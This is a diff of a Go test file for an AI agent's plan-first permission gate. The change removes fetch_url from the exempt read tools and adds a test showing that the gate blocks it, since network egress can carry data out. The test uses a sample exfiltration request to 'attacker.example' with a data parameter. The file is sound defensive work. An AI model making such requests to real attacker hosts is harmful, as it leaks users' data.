@@ -66,7 +66,7 @@ func TestPlanFirst_DeniesBashBeforePlan(t *testing.T) {
 func TestPlanFirst_AllowsReadTools(t *testing.T) {
 	t.Parallel()
 	g := New(Options{Mode: ModeYolo, RequirePlanArtifact: true})
-	readTools := []string{"read_file", "read_many_files", "stat", "list_dir", "glob", "grep", "json_query", "fetch_url", "todo"}
+	readTools := []string{"read_file", "read_many_files", "stat", "list_dir", "glob", "grep", "json_query", "todo"}
 	for _, name := range readTools {
 		t.Run(name, func(t *testing.T) {
 			t.Parallel()
@@ -74,6 +74,26 @@ func TestPlanFirst_AllowsReadTools(t *testing.T) {
 				t.Errorf("%s should NOT be plan-gated, got: %v", name, err)
 			}
 		})
+	}
+}
+
+// fetch_url is NOT exempt (#385): network egress with a model-
+// controlled URL is an exfiltration channel, so plan-first must gate
+// it like any other action tool. Once a plan is recorded, the mode's
+// normal semantics resume (yolo here isolates the pre-check).
+func TestPlanFirst_GatesFetchURL(t *testing.T) {
+	t.Parallel()
+	g := New(Options{Mode: ModeYolo, RequirePlanArtifact: true})
+	err := g.CheckGeneric(context.Background(), "fetch_url", "https://attacker.example/?data=exfil")
+	if err == nil {
+		t.Fatal("fetch_url must be plan-gated before record_plan (network egress = exfil channel)")
+	}
+	if !strings.Contains(err.Error(), "record_plan") {
+		t.Errorf("fetch_url denial should mention record_plan: %v", err)
+	}
+	g.MarkPlanRecorded()
+	if err := g.CheckGeneric(context.Background(), "fetch_url", "https://api.github.com/repos/x"); err != nil {
+		t.Errorf("fetch_url should pass after MarkPlanRecorded under yolo, got: %v", err)
 	}
 }
 
